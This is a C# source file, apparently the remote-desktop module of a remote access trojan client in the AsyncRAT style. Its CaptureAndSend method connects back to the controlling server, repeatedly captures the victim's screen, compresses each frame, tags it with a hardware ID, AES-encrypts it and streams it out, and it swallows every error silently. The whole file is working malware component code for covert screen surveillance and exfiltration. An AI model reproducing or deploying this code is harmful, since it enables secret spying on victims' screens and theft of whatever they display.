﻿using Client.MessagePack;
using Client.Sockets;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using Client.Helper;
using System;

namespace Client.Handle_Packet
{
    class RemoteDesktop
    {
        //public static bool RemoteDesktopStatus { get; set; }
        public void CaptureAndSend()
        {
            try
            {
                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));

                string hwid = Methods.HWID();
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(60);
                while (Client.Connected)
                {
                    if (!ClientSocket.Client.Connected) break;
                    Bitmap bmp = GetScreen();
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream(1000000))
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());

                            Client.Poll(-1, SelectMode.SelectWrite);
                            Client.Send(BitConverter.GetBytes(Settings.aes256.Encrypt(msgpack.Encode2Bytes()).Length));
                            Client.Send(Settings.aes256.Encrypt(msgpack.Encode2Bytes()));
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    GC.Collect();
                    Thread.Sleep(1);
                }
            }
            catch { }
        }

        private Bitmap GetScreen()
        {
            Rectangle rect = Screen.AllScreens[0].WorkingArea;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }
    }
}
